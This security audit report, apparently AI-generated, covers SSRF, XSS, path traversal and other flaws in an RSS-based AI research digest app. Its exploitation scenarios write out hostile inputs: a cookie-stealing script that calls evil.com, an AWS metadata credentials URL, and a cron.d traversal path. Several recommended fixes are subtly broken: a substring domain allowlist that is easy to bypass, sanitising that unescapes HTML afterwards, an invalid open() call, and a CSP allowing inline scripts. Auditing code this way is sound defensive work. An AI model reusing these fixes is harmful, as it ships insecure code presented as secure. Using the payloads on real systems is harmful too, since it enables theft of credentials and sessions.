# Security Audit Report

**Date:** July 1, 2026  
**Repository:** AI Research Digest  
**Auditor:** Cursor Security Review  
**Severity Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🔵 Low | ℹ️ Info

---

## Executive Summary

This security audit identified **12 security vulnerabilities** across different severity levels in the AI Research Digest application. The most critical issues include Server-Side Request Forgery (SSRF), Cross-Site Scripting (XSS), and Path Traversal vulnerabilities. Immediate remediation is recommended for all Critical and High severity issues.

### Vulnerability Summary

- 🔴 **Critical:** 2
- 🟠 **High:** 4  
- 🟡 **Medium:** 4
- 🔵 **Low:** 2

---

## Critical Vulnerabilities

### 🔴 VULN-001: Server-Side Request Forgery (SSRF)

**File:** `fetch_sources.py`  
**Lines:** 48, 114-118  
**CVSS Score:** 9.1 (Critical)

**Description:**  
The application fetches RSS feeds and web content from URLs defined in `config.yaml` without proper validation or restrictions. An attacker who can modify the configuration file or influence its contents could:
- Access internal network resources (metadata endpoints, internal services)
- Scan internal networks
- Potentially access cloud provider metadata endpoints (e.g., AWS EC2 metadata at `http://169.254.169.254/`)
- Bypass firewall rules

**Vulnerable Code:**
```python
def _fetch_rss(self, feed_config: Dict[str, str]) -> List[Dict[str, Any]]:
    try:
        feed = feedparser.parse(feed_config['url'])  # No URL validation
```

**Exploitation Scenario:**
1. Attacker modifies `config.yaml` or submits a PR with malicious URLs:
   ```yaml
   rss_feeds:
     - name: "Malicious Feed"
       url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   ```
2. Application fetches internal AWS credentials
3. Attacker gains access to sensitive cloud resources

**Recommendation:**
- Implement URL allowlisting - only allow known, trusted domains
- Block private IP ranges (RFC 1918, RFC 4193, loopback, link-local)
- Use a dedicated HTTP client with timeout and size limits
- Consider using a proxy service for external requests
- Validate URL schemes (only allow `http://` and `https://`)

**Example Fix:**
```python
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = [
    'huggingface.co',
    'blog.vllm.ai',
    'modal.com',
    'fireworks.ai',
    'sebastianraschka.com',
    'substack.com',
    'jack-clark.net'
]

def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        
        # Only allow http and https
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # Check domain allowlist
        if not any(allowed in parsed.netloc for allowed in ALLOWED_DOMAINS):
            return False
        
        # Resolve hostname and check if it's a private IP
        import socket
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False
            
        return True
    except Exception:
        return False
```

---

### 🔴 VULN-002: Cross-Site Scripting (XSS) in HTML Template

**File:** `template.html`  
**Lines:** 406, 421, 424, 445, 466, 480  
**CVSS Score:** 8.8 (Critical)

**Description:**  
User-controlled content from RSS feeds and arXiv is rendered directly into HTML without proper escaping. Jinja2 auto-escaping is NOT enabled by default when using `Template()` directly. An attacker controlling an RSS feed could inject malicious JavaScript that executes in users' browsers.

**Vulnerable Code:**
```python
# In generate_summary.py line 274
with open(template_path, 'r') as f:
    template = Template(f.read())  # No autoescape=True
```

```html
<!-- In template.html line 406 -->
<a href="{{ item.url }}" target="_blank">{{ item.title }}</a>
<!-- If item.title contains <script>alert('XSS')</script>, it will execute -->

<!-- Line 421 -->
<strong>Innovation:</strong> {{ item.core_innovation }}

<!-- Line 424 -->
<strong>Why it matters:</strong> {{ item.significance }}
```

**Exploitation Scenario:**
1. Attacker creates malicious RSS feed with payload in title:
   ```xml
   <title>&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</title>
   ```
2. Application fetches and processes the feed
3. LLM may pass through or modify the title
4. JavaScript executes in victim browsers, stealing cookies/sessions

**Recommendation:**
- Enable Jinja2 auto-escaping
- Validate and sanitize all external content
- Implement Content Security Policy (CSP) headers
- Use `| escape` filter explicitly for all user content

**Example Fix:**
```python
from jinja2 import Environment, FileSystemLoader

env = Environment(
    loader=FileSystemLoader('.'),
    autoescape=True  # Enable auto-escaping
)
template = env.get_template('template.html')
```

---

## High Severity Vulnerabilities

### 🟠 VULN-003: Path Traversal in File Operations

**File:** `generate_summary.py`  
**Lines:** 227, 245, 303  
**CVSS Score:** 7.5 (High)

**Description:**  
The application constructs file paths from configuration values without proper validation. An attacker who can modify `config.yaml` could potentially write files outside the intended directories.

**Vulnerable Code:**
```python
def save_summary(summary: Dict[str, Any], output_dir: str):
    Path(output_dir).mkdir(parents=True, exist_ok=True)  # Creates any directory
    date_str = datetime.now().strftime("%Y-%m-%d")
    filepath = Path(output_dir) / f"{date_str}.json"  # Path traversal possible
```

**Exploitation Scenario:**
```yaml
build:
  summary_storage: "../../../../etc/cron.d/"  # Write to system directories
  output_dir: "/tmp/malicious/"
```

**Recommendation:**
- Validate that paths resolve within expected directories
- Use `Path.resolve()` and check the result
- Reject paths containing `..` or absolute paths
- Use a safelist of allowed directories

**Example Fix:**
```python
def safe_path(base_dir: str, user_path: str) -> Path:
    base = Path(base_dir).resolve()
    target = (base / user_path).resolve()
    
    # Ensure target is within base directory
    if not target.is_relative_to(base):
        raise ValueError(f"Path traversal detected: {user_path}")
    
    return target
```

---

### 🟠 VULN-004: Information Disclosure via Debug Files

**File:** `generate_summary.py`  
**Lines:** 135-138  
**CVSS Score:** 7.2 (High)

**Description:**  
When JSON parsing fails, the application writes the complete LLM response to a debug file in the current directory. These files may contain sensitive information from the API response and are not cleaned up.

**Vulnerable Code:**
```python
debug_file = f"debug_response_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(debug_file, "w") as f:
    f.write(response_text)
print(f"  Raw response saved to {debug_file}")
```

**Risk:**
- Debug files accumulate in the repository
- May be committed to version control
- Could contain sensitive information from scraped content
- Accessible if deployed with debug files

**Recommendation:**
- Write debug files to a designated temp directory
- Add debug files to `.gitignore`
- Implement automatic cleanup
- Add file permissions restrictions
- Consider logging to a proper logging system instead

**Example Fix:**
```python
import tempfile
import os

# Use temp directory
debug_dir = Path(tempfile.gettempdir()) / "ai-digest-debug"
debug_dir.mkdir(exist_ok=True)

debug_file = debug_dir / f"debug_response_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(debug_file, "w", mode=0o600) as f:  # Restrict permissions
    f.write(response_text)

# Add to gitignore
# debug_response_*.txt
```

---

### 🟠 VULN-005: Insufficient Input Validation on External Content

**File:** `fetch_sources.py`  
**Lines:** 62-71, 96-106  
**CVSS Score:** 7.0 (High)

**Description:**  
Content from RSS feeds and arXiv is not validated or sanitized before being passed to the LLM and rendered in HTML. This could lead to:
- Prompt injection attacks on the LLM
- XSS attacks (combined with VULN-002)
- Resource exhaustion from extremely large inputs

**Vulnerable Code:**
```python
item = {
    'title': entry.get('title', 'Untitled'),  # No validation
    'url': entry.get('link', ''),
    'summary': entry.get('summary', entry.get('description', '')),  # Could be huge
    # ... no length checks or sanitization
}
```

**Recommendation:**
- Implement maximum length limits for all fields
- Sanitize HTML/XML entities
- Validate URLs properly
- Strip potentially dangerous content
- Implement rate limiting per source

**Example Fix:**
```python
import html
import re

MAX_TITLE_LENGTH = 500
MAX_SUMMARY_LENGTH = 5000
URL_PATTERN = re.compile(r'^https?://[^\s<>"{}|\\^`\[\]]+$')

def sanitize_text(text: str, max_length: int) -> str:
    if not text:
        return ""
    # Remove control characters
    text = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', text)
    # Truncate
    text = text[:max_length]
    # Unescape HTML entities
    text = html.unescape(text)
    return text.strip()

def validate_url(url: str) -> bool:
    if not url or len(url) > 2048:
        return False
    return bool(URL_PATTERN.match(url))

item = {
    'title': sanitize_text(entry.get('title', 'Untitled'), MAX_TITLE_LENGTH),
    'url': entry.get('link', '') if validate_url(entry.get('link', '')) else '',
    'summary': sanitize_text(entry.get('summary', ''), MAX_SUMMARY_LENGTH),
    # ...
}
```

---

### 🟠 VULN-006: Insecure Deserialization Risk

**File:** `generate_summary.py`  
**Lines:** 254-256  
**CVSS Score:** 6.8 (High)

**Description:**  
The application loads JSON files from the filesystem without validation. If an attacker can write to the `summaries/` directory (via path traversal or other means), they could inject malicious JSON that gets processed and rendered.

**Vulnerable Code:**
```python
with open(filepath, 'r') as f:
    data = json.load(f)  # No validation
    data['date'] = date_str
    summaries.append(data)
```

**Recommendation:**
- Validate JSON structure against a schema
- Verify expected fields exist and have correct types
- Implement file integrity checks
- Restrict write permissions to summary directory

**Example Fix:**
```python
from jsonschema import validate, ValidationError

SUMMARY_SCHEMA = {
    "type": "object",
    "required": ["items", "trends", "summary", "generated_at", "model"],
    "properties": {
        "items": {"type": "array"},
        "trends": {"type": "array"},
        "summary": {"type": "string", "maxLength": 1000},
        "generated_at": {"type": "string"},
        "model": {"type": "string"},
        "total_items_analyzed": {"type": "number"}
    }
}

try:
    with open(filepath, 'r') as f:
        data = json.load(f)
        validate(instance=data, schema=SUMMARY_SCHEMA)
        data['date'] = date_str
        summaries.append(data)
except ValidationError as e:
    print(f"Invalid summary format in {filepath}: {e}")
```

---

## Medium Severity Vulnerabilities

### 🟡 VULN-007: Regular Expression Denial of Service (ReDoS)

**File:** `generate_summary.py`  
**Lines:** 145-150  
**CVSS Score:** 5.9 (Medium)

**Description:**  
Complex regular expressions used for JSON cleanup could be vulnerable to ReDoS attacks if an attacker can control the LLM output (via prompt injection).

**Vulnerable Code:**
```python
fixed_text = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', fixed_text)
fixed_text = re.sub(r'(?<!\\)\\n', ' ', fixed_text)
fixed_text = re.sub(r'(?<!\\)\\t', ' ', fixed_text)
```

**Recommendation:**
- Set timeout limits for regex operations
- Use simpler patterns where possible
- Limit input size before applying regex
- Consider using `re.error` handling

---

### 🟡 VULN-008: Missing Rate Limiting on API Calls

**File:** `fetch_sources.py`  
**Lines:** 32, 38  
**CVSS Score:** 5.5 (Medium)

**Description:**  
While the code includes `time.sleep(1)`, there's no comprehensive rate limiting for external API calls. This could lead to:
- IP bans from external services
- Excessive API costs if exploited
- Resource exhaustion

**Vulnerable Code:**
```python
time.sleep(1)  # Simple sleep, not proper rate limiting
```

**Recommendation:**
- Implement token bucket or sliding window rate limiting
- Track failed requests and implement exponential backoff
- Add per-source rate limits
- Monitor and alert on unusual activity

---

### 🟡 VULN-009: Unsafe Git Operations in CI/CD

**File:** `.github/workflows/nightly-build.yml`  
**Lines:** 49-64  
**CVSS Score:** 5.3 (Medium)

**Description:**  
The GitHub Actions workflow commits and pushes changes automatically without verification. An attacker who compromises the workflow could potentially:
- Commit malicious code
- Modify security-sensitive files
- Push to main branch without review

**Vulnerable Code:**
```yaml
- name: Commit and push summaries
  run: |
    git add summaries/*.json
    git add -f public/index.html
    git commit -m "Update AI digest - $(date +'%Y-%m-%d')"
    git push
```

**Recommendation:**
- Use separate branch for automated commits
- Require PR review for merges to main
- Implement commit signing
- Validate file contents before committing
- Use branch protection rules

---

### 🟡 VULN-010: Hardcoded Model Parameters

**File:** `generate_summary.py`  
**Lines:** 72, 74  
**CVSS Score:** 4.5 (Medium)

**Description:**  
Default values for model configuration are hardcoded, and there's no validation of config values. An attacker modifying the config could potentially:
- Set extremely high token limits causing high API costs
- Use unauthorized models
- Modify temperature to produce unpredictable outputs

**Recommendation:**
- Validate all config values against allowed ranges
- Implement cost limits
- Add monitoring for unusual configurations

---

## Low Severity Vulnerabilities

### 🔵 VULN-011: Insecure File Permissions

**File:** Multiple  
**CVSS Score:** 3.8 (Low)

**Description:**  
Generated files do not have explicit permission settings, potentially allowing broader access than intended.

**Recommendation:**
```python
import os

# Set restrictive permissions when creating files
os.umask(0o077)
with open(filepath, 'w') as f:
    f.write(content)
os.chmod(filepath, 0o600)  # Only owner can read/write
```

---

### 🔵 VULN-012: Missing Security Headers in HTML

**File:** `template.html`  
**CVSS Score:** 3.5 (Low)

**Description:**  
The HTML template does not include security-related meta tags or Content Security Policy.

**Recommendation:**
```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
    <title>AI Research Digest</title>
</head>
```

---

## Dependency Security

### Outdated or Potentially Vulnerable Dependencies

**File:** `requirements.txt`

Run a dependency check:
```bash
pip install safety
safety check -r requirements.txt
```

**Recommendation:**
- Regularly update dependencies
- Use Dependabot or Renovate for automated updates
- Pin versions with hash verification
- Audit dependencies for known CVEs

**Current Dependencies:**
```
feedparser>=6.0.0      # Check for latest version
requests>=2.31.0       # Check for latest version  
beautifulsoup4>=4.12.0 # Check for latest version
anthropic>=0.25.0      # Check for latest version
```

---

## Secret Management

### ℹ️ INFO-001: API Key Management

**Current Implementation:**  
API keys are stored in environment variables, which is a standard practice, but requires careful handling.

**Recommendations:**
1. Never commit secrets to git
2. Use secret scanning tools (GitHub secret scanning, TruffleHog)
3. Rotate keys regularly
4. Use different keys for dev/staging/prod
5. Consider using AWS Secrets Manager or similar for production
6. Add pre-commit hooks to prevent secret leaks

**Add to `.gitignore`:**
```
.env
.env.*
*.key
*.pem
*secret*
*credential*
```

---

## Configuration Security

### ℹ️ INFO-002: Insecure Default Configuration

**File:** `config.yaml`

**Issues:**
- Configuration file is committed to repository
- Anyone with repo access can modify sources
- No validation of configuration changes

**Recommendations:**
1. Implement configuration validation schema
2. Use separate config for different environments
3. Require review for config changes
4. Add integrity checks (checksums)
5. Consider moving sensitive config to environment variables

---

## CI/CD Security

### Recommendations for GitHub Actions:

1. **Minimize Permissions:**
   ```yaml
   permissions:
     contents: write  # Only what's needed
   ```

2. **Pin Action Versions:**
   ```yaml
   - uses: actions/checkout@v4  # Good
   - uses: actions/checkout@latest  # Bad
   ```

3. **Use OIDC for AWS Authentication** (instead of long-lived credentials)

4. **Enable Branch Protection:**
   - Require PR reviews
   - Require status checks
   - Restrict who can push

5. **Audit Workflow Logs** for secrets exposure

---

## Immediate Action Items

### Priority 1 (Critical - Fix within 24 hours):
1. ✅ Fix SSRF vulnerability (VULN-001) - Implement URL validation and allowlisting
2. ✅ Enable Jinja2 auto-escaping (VULN-002) - Prevent XSS attacks

### Priority 2 (High - Fix within 1 week):
3. ✅ Fix path traversal (VULN-003) - Validate all file paths
4. ✅ Secure debug file handling (VULN-004) - Move to temp directory
5. ✅ Implement input validation (VULN-005) - Sanitize external content
6. ✅ Add JSON schema validation (VULN-006) - Validate loaded data

### Priority 3 (Medium - Fix within 2 weeks):
7. ⚠️ Add proper rate limiting (VULN-008)
8. ⚠️ Improve CI/CD security (VULN-009)
9. ⚠️ Validate configuration values (VULN-010)

### Priority 4 (Low - Fix within 1 month):
10. 📋 Set file permissions (VULN-011)
11. 📋 Add security headers (VULN-012)
12. 📋 Update dependencies
13. 📋 Implement secret scanning

---

## Security Best Practices for Future Development

### 1. Secure Development Lifecycle:
- Perform security reviews for all PRs
- Run automated security scans (SAST/DAST)
- Implement pre-commit hooks for secret detection
- Regular dependency audits

### 2. Input Validation:
- Validate all external input
- Use allowlists over denylists
- Sanitize before processing
- Implement length limits

### 3. Output Encoding:
- Use proper escaping for HTML, JSON, etc.
- Enable auto-escaping in templates
- Validate data before rendering

### 4. Least Privilege:
- Minimize file permissions
- Limit API permissions
- Use separate credentials for different environments
- Implement proper access controls

### 5. Defense in Depth:
- Multiple layers of security
- Fail securely
- Log security events
- Monitor for anomalies

### 6. Monitoring and Logging:
```python
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Log security events
logger.warning(f"Blocked suspicious URL: {url}")
logger.error(f"Path traversal attempt detected: {user_path}")
```

---

## Testing Recommendations

### Security Testing Checklist:

1. **Static Analysis:**
   - `bandit -r .` (Python security linter)
   - `safety check` (dependency vulnerabilities)
   - `semgrep --config=auto .` (pattern-based scanning)

2. **Dynamic Analysis:**
   - Test with malicious RSS feeds
   - Attempt path traversal attacks
   - Try XSS payloads
   - Test SSRF with internal URLs

3. **Penetration Testing:**
   - Consider engaging security professionals
   - Test in isolated environment
   - Document findings

---

## Compliance Considerations

### Data Privacy:
- Review if any PII is being collected
- Implement data retention policies
- Consider GDPR/CCPA requirements if applicable

### Open Source Security:
- Add SECURITY.md for responsible disclosure
- Set up security advisory alerts
- Document security update process

---

## Conclusion

This application has several security vulnerabilities that require immediate attention. The most critical issues are:

1. **SSRF** - Could allow access to internal resources
2. **XSS** - Could compromise user browsers
3. **Path Traversal** - Could allow writing to arbitrary locations

Following the remediation steps outlined above will significantly improve the security posture of the application. Regular security reviews and updates should be part of the development process.

---

## Appendix A: Security Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Cheat Sheets: https://cheatsheetseries.owasp.org/
- CWE (Common Weakness Enumeration): https://cwe.mitre.org/
- CVE Database: https://cve.mitre.org/
- Python Security: https://python.readthedocs.io/en/latest/library/security_warnings.html

## Appendix B: Contact Information

For questions about this security audit, please contact the security team or open a GitHub issue with the `security` label.

**Report Security Vulnerabilities:** See SECURITY.md for responsible disclosure policy.

---

*This security audit was performed on July 1, 2026. The security landscape changes rapidly - regular re-assessments are recommended.*
